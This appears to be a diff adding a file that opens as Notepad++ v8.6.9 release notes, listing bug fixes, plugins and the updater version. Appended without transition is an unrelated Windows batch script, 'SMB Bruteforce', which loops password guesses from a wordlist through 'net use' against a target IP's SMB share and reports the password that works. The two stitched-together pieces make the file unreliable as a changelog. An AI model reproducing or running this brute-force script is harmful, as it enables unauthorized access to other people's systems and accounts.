@@ -1,0 +1,74 @@
+Notepad++ v8.6.9 bug-fixes & new enhancements:
+
+ 1. Make installation and updates easy & quiet by adding "Yes (Silent)" button.
+ 2. Add new options '/closeRunningNpp' & '/runNppAfterSilentInstall' in the installer.
+ 3. Fix crash of "Next Search Result" command on the empty search result.
+ 4. Fix the regression where the Find dialog size is not remembered across sessions.
+ 5. Fix the regression of content lost by using Encoding "Convert to..." commands. 
+ 6. Fix the regression of exception/crash on Windows Server Core 2022.
+ 7. Prevent DirectWrite from being enabled under Windows Sever.
+ 8. Enhance the quality of Fluent toolbar icon sets for different DPI settings.
+ 9. Improve the look & feel of tabbar close button in dark mode.
+10. Improve the dark mode tab bar icon in the search results panel.
+11. Add ability to pre-populate the predefined color sets for custom tones.
+12. Add "Show All Character" popup menu on toolbar button.
+13. Fix the rectangular selection copy-paste bug.
+14. Allow opening shortcut files (*.lnk) directly if the file extension is changed.
+15. Fix the lost panels issue.
+16. Add Backspace unindent option.
+17. Fix CSS more indentation bug.
+18. Include F13-F24 keys in Shortcut Mapper.
+19. Fix the problem where the last empty clean untitled tab cannot be closed after renaming.
+20. Add plugin a command (NPPM_SETUNTITLEDNAME) to rename untitled tab.
+21. Display a message box with information about disabled backward regex searching.
+22. Fix the display glitch for unsaved tabs containing tab characters.
+23. Fix status bar and tab bar flicker during the GUI updated (fixed only for dark mode).
+24. Fix the issue with "Begin/End Select" command after deletion.
+25. Resolve the integer overflow problem in the Column Editor.
+26. Adjust the position of hits text in the File Progress dialog.
+27. Fix the deployment of other software blocked due to NppShell.
+
+
+Get more info on
+https://notepad-plus-plus.org/downloads/v8.6.9/
+
+
+Included plugins:
+
+1.  NppExport v0.4
+2.  Converter v4.6
+3.  Mime Tool v3.1
+
+
+Updater (Installer only):
+
+* WinGUp (for Notepad++) v5.3
+@echo off
+title SMB Bruteforce - by V
+color A
+echo.
+set /p ip="Enter IP Address: "
+set /p user="Enter Username: "
+set /p wordlist="Enter Password List: "
+
+set /a count=1
+for /f %%a in (%wordlist%) do (
+  set pass=%%a
+  call :attempt
+)
+echo Password not Found :(
+pause
+exit
+
+:success
+echo.
+echo Password Found! %pass%
+net use \\%ip% /d /y >nul 2>&1
+pause
+exit
+
+:attempt
+net use \\%ip% /user:%user% %pass% >nul 2>&1
+echo [ATTEMPT %count%] [%pass%]
+set /a count=%count%+1
+if %errorlevel% EQU 0 goto success
